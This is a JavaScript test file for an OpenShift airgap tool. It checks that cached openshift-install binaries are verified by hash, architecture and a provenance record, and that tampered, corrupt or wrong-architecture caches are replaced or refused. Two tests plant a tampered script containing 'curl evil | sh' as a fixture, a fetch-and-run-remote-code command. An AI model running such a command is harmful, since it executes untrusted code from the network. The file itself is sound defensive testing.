/**
 * OpenShift Airgap Architect — extracted-binary cache provenance (R2)
 *
 * `verifiedDownload.js` proved TARBALLS. What gets spawned and shipped is the
 * EXECUTABLE extracted from one, and both cache hits returned it unchecked:
 *
 *   backend/src/installer.js:113        `if (fs.existsSync(target)) return target;`
 *   backend/src/openshiftInstaller.js:167  the same shape
 *
 * The `installer.js` path is the worse of the two. Its cache key is
 * `openshift-install-<version>` with NO architecture segment, while the mirror
 * publishes four DIFFERENT binaries under one file name — so a binary
 * extracted on an x86_64 host sat at exactly the path an aarch64 host looks
 * in, and was then handed to `spawn()` for `coreos print-stream-json`.
 *
 * Six cases are required and all six are here, named for what they are:
 * pre-existing unverified cache, tampered executable, architecture change at
 * the same version, sidecar corruption, process restart, valid offline reuse.
 *
 * Hermetic. The fixture `fetch` serves a real gzip tarball built in-process, so
 * extraction is genuinely exercised; nothing contacts mirror.openshift.com, and
 * a test that reaches the network is asserted against explicitly.
 *
 * @author Bill Strauss
 * Developed with AI assistance from Claude (Anthropic) and Cursor AI.
 */

import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";

import { ensureInstaller, INSTALLER_TARBALL } from "../src/installer.js";
import {
  verifyCachedBinary,
  writeBinaryProvenance,
  readBinaryProvenance,
  provenancePathFor,
  PROVENANCE_SCHEMA_VERSION
} from "../src/binaryProvenance.js";

const sha256 = (buf) => createHash("sha256").update(buf).digest("hex");
const VERSION = "4.22.3";

let workDir;
let toolsDir;

/**
 * A real .tar.gz containing an `openshift-install` shell script whose body
 * identifies the architecture it was built for.
 *
 * It has to be a real archive because `ensureInstaller` shells out to `tar`,
 * and it has to differ per architecture because that is the whole point of the
 * cross-arch case below.
 */
function buildInstallerTarball(archLabel) {
  const stage = fs.mkdtempSync(path.join(workDir, `stage-${archLabel}-`));
  const script = `#!/bin/sh\necho '{"arch":"${archLabel}"}'\n`;
  fs.writeFileSync(path.join(stage, "openshift-install"), script, { mode: 0o755 });
  fs.writeFileSync(path.join(stage, "README.md"), "not the binary\n");
  const tarPath = path.join(stage, "out.tar.gz");
  execFileSync("tar", ["-czf", tarPath, "-C", stage, "openshift-install", "README.md"]);
  const bytes = fs.readFileSync(tarPath);
  fs.rmSync(stage, { recursive: true, force: true });
  return bytes;
}

/**
 * Fetch stand-in for one architecture's channel, counting requests so an
 * "offline reuse" claim can be proven rather than asserted.
 */
function makeFixtureFetch(archLabel) {
  const tarball = buildInstallerTarball(archLabel);
  const manifest = `${sha256(tarball)}  ${INSTALLER_TARBALL}\n`;
  const calls = [];

  const fetchImpl = async (url) => {
    calls.push(url);
    if (url.endsWith("sha256sum.txt")) {
      return { ok: true, status: 200, text: async () => manifest };
    }
    if (url.endsWith(INSTALLER_TARBALL)) {
      return {
        ok: true,
        status: 200,
        body: new ReadableStream({
          start(controller) {
            controller.enqueue(new Uint8Array(tarball));
            controller.close();
          }
        })
      };
    }
    return { ok: false, status: 404, text: async () => "not found" };
  };

  return { fetchImpl, calls, tarball, tarballSha256: sha256(tarball) };
}

/** A fetch that cannot reach anything — the airgapped / mirror-down case. */
const offlineFetch = async () => {
  throw new Error("getaddrinfo ENOTFOUND mirror.openshift.com");
};

const installerTargetPath = () => path.join(toolsDir, `openshift-install-${VERSION}`);

beforeEach(() => {
  workDir = fs.mkdtempSync(path.join(os.tmpdir(), "oaa-installer-cache-"));
  toolsDir = path.join(workDir, "tools");
  fs.mkdirSync(toolsDir, { recursive: true });
});

afterEach(() => {
  fs.rmSync(workDir, { recursive: true, force: true });
});

describe("binaryProvenance — the record is evidence, not a substitute for the hash", () => {
  it("records every identity field the reuse check compares", async () => {
    const binary = path.join(workDir, "some-binary");
    fs.writeFileSync(binary, "#!/bin/sh\nexit 0\n", { mode: 0o755 });

    const record = await writeBinaryProvenance(binary, {
      tool: "openshift-install",
      version: VERSION,
      platform: "linux",
      arch: "x86_64",
      variant: "standard",
      tarballSha256: "a".repeat(64)
    });

    assert.equal(record.schemaVersion, PROVENANCE_SCHEMA_VERSION);
    assert.equal(record.binarySha256, sha256(fs.readFileSync(binary)));
    for (const field of ["tool", "version", "platform", "arch", "variant", "tarballSha256"]) {
      assert.ok(record[field], `record must bind ${field}`);
    }
  });

  it("writes the record atomically, leaving no staging file", async () => {
    const binary = path.join(workDir, "atomic-binary");
    fs.writeFileSync(binary, "payload");
    await writeBinaryProvenance(binary, {
      tool: "t", version: VERSION, platform: "linux", arch: "x86_64",
      variant: "standard", tarballSha256: "b".repeat(64)
    });

    const leftovers = fs.readdirSync(workDir).filter((n) => n.includes(".tmp-"));
    assert.deepEqual(leftovers, [], "no partially written record may survive");
    assert.ok(await readBinaryProvenance(binary));
  });

  it("refuses a record whose schema this build does not understand", async () => {
    const binary = path.join(workDir, "future-binary");
    fs.writeFileSync(binary, "payload");
    await writeBinaryProvenance(binary, {
      tool: "t", version: VERSION, platform: "linux", arch: "x86_64",
      variant: "standard", tarballSha256: "c".repeat(64)
    });
    const recordPath = provenancePathFor(binary);
    const record = JSON.parse(fs.readFileSync(recordPath, "utf8"));
    record.schemaVersion = PROVENANCE_SCHEMA_VERSION + 1;
    fs.writeFileSync(recordPath, JSON.stringify(record));

    const verdict = await verifyCachedBinary(binary, { tool: "t" });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "unsupported-provenance-schema");
  });
});

describe("openshift-install cache — unverifiable bytes are never returned", () => {
  it("CASE 1: refuses a pre-existing cache that predates provenance recording", async () => {
    // Exactly the bypass that existed: a binary at the cache path, nothing
    // else. The old code returned it and spawned it.
    const target = installerTargetPath();
    fs.writeFileSync(target, "#!/bin/sh\necho legacy\n", { mode: 0o755 });
    const legacyBytes = fs.readFileSync(target);

    const fixture = makeFixtureFetch("x86_64");
    const result = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl,
      nodeArch: "x64",
      toolsDirOverride: toolsDir
    });

    assert.equal(result, target);
    assert.notEqual(
      fs.readFileSync(target).toString(),
      legacyBytes.toString(),
      "the unverified legacy binary must be replaced, not returned"
    );
    assert.ok(fixture.calls.some((u) => u.endsWith(INSTALLER_TARBALL)), "it must reacquire");
    const record = await readBinaryProvenance(target);
    assert.equal(record.binarySha256, sha256(fs.readFileSync(target)));
  });

  it("CASE 1b: fails closed, with the reason, when a legacy cache cannot be reacquired", async () => {
    const target = installerTargetPath();
    fs.writeFileSync(target, "#!/bin/sh\necho legacy\n", { mode: 0o755 });

    await assert.rejects(
      () =>
        ensureInstaller(VERSION, {
          fetchImpl: offlineFetch,
          nodeArch: "x64",
          toolsDirOverride: toolsDir
        }),
      (err) => {
        assert.match(err.message, /predates binary provenance|cannot be proven verified/i);
        assert.match(err.message, /could not be re-acquired/i);
        return true;
      }
    );

    assert.equal(
      fs.existsSync(target),
      false,
      "unprovable bytes must be discarded, not left for the next call to find"
    );
  });

  it("CASE 2: refuses an executable tampered with after it was recorded", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl,
      nodeArch: "x64",
      toolsDirOverride: toolsDir
    });
    const recorded = (await readBinaryProvenance(target)).binarySha256;

    // Swap the bytes, leave the record alone. This is the attack the record
    // exists to detect, and the reason the digest is recomputed every time.
    fs.writeFileSync(target, "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 });

    const verdict = await verifyCachedBinary(target, {
      tool: "openshift-install", version: VERSION, platform: "linux",
      arch: "x86_64", variant: "standard"
    });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "binary-digest-mismatch");

    // Recovery, with NO network. The verified tarball beside it is still
    // intact and still proves its own digest, so the tampered executable is
    // re-extracted from verified bytes rather than merely rejected. That is
    // what an airgapped host needs, and it is only sound because the tarball
    // is re-hashed too — not because it was trusted once.
    const restored = await ensureInstaller(VERSION, {
      fetchImpl: offlineFetch,
      nodeArch: "x64",
      toolsDirOverride: toolsDir
    });

    assert.equal(restored, target);
    assert.equal(
      (await readBinaryProvenance(target)).binarySha256,
      recorded,
      "the restored binary must hash to the originally recorded digest"
    );
    assert.doesNotMatch(
      fs.readFileSync(target).toString(),
      /curl evil/,
      "the tampered bytes must not survive anywhere on the returned path"
    );
  });

  it("CASE 2b: fails closed when the executable is tampered AND no verified tarball remains", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    // Remove every verified source of truth, then tamper. There is now
    // genuinely nothing to recover from offline, and the only correct answer
    // is an error that names both halves of the problem.
    for (const name of fs.readdirSync(toolsDir)) {
      if (name.includes(".tar.gz")) fs.rmSync(path.join(toolsDir, name), { force: true });
    }
    fs.writeFileSync(target, "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 });

    await assert.rejects(
      () =>
        ensureInstaller(VERSION, {
          fetchImpl: offlineFetch, nodeArch: "x64", toolsDirOverride: toolsDir
        }),
      (err) => {
        assert.match(err.message, /no longer match the digest recorded/i);
        assert.match(err.message, /could not be re-acquired/i);
        return true;
      }
    );
    assert.equal(fs.existsSync(target), false, "tampered bytes must be removed, not left behind");
  });

  it("CASE 3: refuses a binary cached for a different host architecture at the same version", async () => {
    // The cache path carries no architecture, so this is a genuine collision
    // rather than a contrived one.
    const x86 = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: x86.fetchImpl,
      nodeArch: "x64",
      toolsDirOverride: toolsDir
    });
    assert.equal((await readBinaryProvenance(target)).arch, "x86_64");
    const x86Bytes = fs.readFileSync(target).toString();

    // Same version, same path, different host. Must NOT be reused.
    const arm = makeFixtureFetch("aarch64");
    const armTarget = await ensureInstaller(VERSION, {
      fetchImpl: arm.fetchImpl,
      nodeArch: "arm64",
      toolsDirOverride: toolsDir
    });

    assert.equal(armTarget, target, "precondition: both architectures resolve to one cache path");
    assert.ok(
      arm.calls.some((u) => u.includes("/aarch64/")),
      "the aarch64 channel must be fetched, not the cached x86_64 binary reused"
    );
    const reRecorded = await readBinaryProvenance(target);
    assert.equal(reRecorded.arch, "aarch64");
    assert.notEqual(fs.readFileSync(target).toString(), x86Bytes);
    assert.match(fs.readFileSync(target).toString(), /aarch64/);
  });

  it("CASE 3b: reports the mismatching field rather than a bare refusal", async () => {
    const x86 = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: x86.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    const verdict = await verifyCachedBinary(target, {
      tool: "openshift-install", version: VERSION, platform: "linux",
      arch: "aarch64", variant: "standard"
    });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "identity-mismatch");
    assert.match(verdict.detail, /arch: cached x86_64, required aarch64/);
  });

  it("CASE 4: refuses a cache whose sidecar record is corrupt", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    fs.writeFileSync(provenancePathFor(target), '{"schemaVersion": 1, "tool": "openshi');

    const verdict = await verifyCachedBinary(target, { tool: "openshift-install" });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "unreadable-provenance-record");

    // Rebuilt from the still-verified tarball, offline, with a fresh record.
    const repaired = await ensureInstaller(VERSION, {
      fetchImpl: offlineFetch, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    const rewritten = await readBinaryProvenance(repaired);
    assert.ok(rewritten, "a readable record must replace the corrupt one");
    assert.equal(rewritten.binarySha256, sha256(fs.readFileSync(target)));

    // And with nothing verified left to rebuild from, it fails closed.
    for (const name of fs.readdirSync(toolsDir)) {
      if (name.includes(".tar.gz")) fs.rmSync(path.join(toolsDir, name), { force: true });
    }
    fs.writeFileSync(provenancePathFor(target), "{ truncated");
    await assert.rejects(
      () =>
        ensureInstaller(VERSION, {
          fetchImpl: offlineFetch, nodeArch: "x64", toolsDirOverride: toolsDir
        }),
      /provenance record is corrupt/i
    );
    assert.equal(fs.existsSync(target), false);
  });

  it("CASE 4b: refuses a record that parses but is missing identity fields", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    const record = JSON.parse(fs.readFileSync(provenancePathFor(target), "utf8"));
    delete record.arch;
    fs.writeFileSync(provenancePathFor(target), JSON.stringify(record));

    const verdict = await verifyCachedBinary(target, { tool: "openshift-install" });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "incomplete-provenance-record");
    assert.equal(verdict.detail, "arch");
  });

  it("CASE 5: survives a process restart — the record is on disk, not in memory", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    const beforeRestart = (await readBinaryProvenance(target)).binarySha256;

    // A fresh `node` process, no shared module state, no network at all:
    // whatever it decides it decides from the filesystem alone.
    const probe = path.join(workDir, "restart-probe.mjs");
    fs.writeFileSync(
      probe,
      `import { verifyCachedBinary } from ${JSON.stringify(path.resolve("src/binaryProvenance.js"))};\n` +
        `const v = await verifyCachedBinary(${JSON.stringify(target)}, {\n` +
        `  tool: "openshift-install", version: ${JSON.stringify(VERSION)},\n` +
        `  platform: "linux", arch: "x86_64", variant: "standard"\n` +
        `});\n` +
        `process.stdout.write(JSON.stringify(v));\n`
    );
    const out = execFileSync(process.execPath, [probe], { encoding: "utf8" });
    const verdict = JSON.parse(out);

    assert.equal(verdict.usable, true, `a restarted process must still trust the record: ${out}`);
    assert.equal(verdict.record.binarySha256, beforeRestart);
  });

  it("CASE 5b: a binary left without its record by a crash is discarded, not trusted", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    // Simulates a crash between `rename` and the record write.
    fs.rmSync(provenancePathFor(target));

    const verdict = await verifyCachedBinary(target, { tool: "openshift-install" });
    assert.equal(verdict.usable, false);
    assert.equal(verdict.reason, "no-provenance-record");
  });

  it("CASE 6: reuses a valid cache with no network access whatsoever", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    const firstDigest = (await readBinaryProvenance(target)).binarySha256;

    // The offline fetch THROWS if touched, so a pass here is proof of an
    // offline-capable path, not an inference from a call count.
    const reused = await ensureInstaller(VERSION, {
      fetchImpl: offlineFetch, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    assert.equal(reused, target);
    assert.equal(
      (await readBinaryProvenance(target)).binarySha256,
      firstDigest,
      "a valid offline reuse must not rewrite the record"
    );
    assert.ok(fs.existsSync(target));
  });

  it("CASE 6b: offline reuse re-hashes the bytes rather than trusting the path", async () => {
    const fixture = makeFixtureFetch("x86_64");
    const target = await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    const good = fs.readFileSync(target);

    // A SINGLE flipped byte, record untouched — the case a path-existence
    // check cannot see and a size check cannot see either.
    const bytes = Buffer.from(good);
    bytes[bytes.length - 1] ^= 0xff;
    fs.writeFileSync(target, bytes);

    const verdict = await verifyCachedBinary(target, {
      tool: "openshift-install", version: VERSION, platform: "linux",
      arch: "x86_64", variant: "standard"
    });
    assert.equal(verdict.usable, false, "a one-byte change must be detected");
    assert.equal(verdict.reason, "binary-digest-mismatch");

    // Repaired offline from the verified tarball, back to the correct bytes.
    await ensureInstaller(VERSION, {
      fetchImpl: offlineFetch, nodeArch: "x64", toolsDirOverride: toolsDir
    });
    assert.equal(
      sha256(fs.readFileSync(target)),
      sha256(good),
      "the corrupted byte must be gone after repair"
    );
  });
});

describe("openshift-install cache — Red Hat URL and variant policy is unchanged", () => {
  it("still resolves the per-architecture client channel for the target version", async () => {
    const fixture = makeFixtureFetch("ppc64le");
    await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "ppc64le", toolsDirOverride: toolsDir
    });

    assert.ok(
      fixture.calls.includes(
        `https://mirror.openshift.com/pub/openshift-v4/ppc64le/clients/ocp/${VERSION}/sha256sum.txt`
      ),
      `manifest URL unchanged; saw ${JSON.stringify(fixture.calls)}`
    );
    assert.ok(
      fixture.calls.includes(
        `https://mirror.openshift.com/pub/openshift-v4/ppc64le/clients/ocp/${VERSION}/${INSTALLER_TARBALL}`
      ),
      "artifact URL unchanged"
    );
  });

  it("still fetches the manifest before the artifact", async () => {
    const fixture = makeFixtureFetch("x86_64");
    await ensureInstaller(VERSION, {
      fetchImpl: fixture.fetchImpl, nodeArch: "x64", toolsDirOverride: toolsDir
    });

    const manifestAt = fixture.calls.findIndex((u) => u.endsWith("sha256sum.txt"));
    const artifactAt = fixture.calls.findIndex((u) => u.endsWith(INSTALLER_TARBALL));
    assert.ok(manifestAt >= 0 && artifactAt >= 0);
    assert.ok(manifestAt < artifactAt, "nothing is downloaded before its expected digest is known");
  });
});
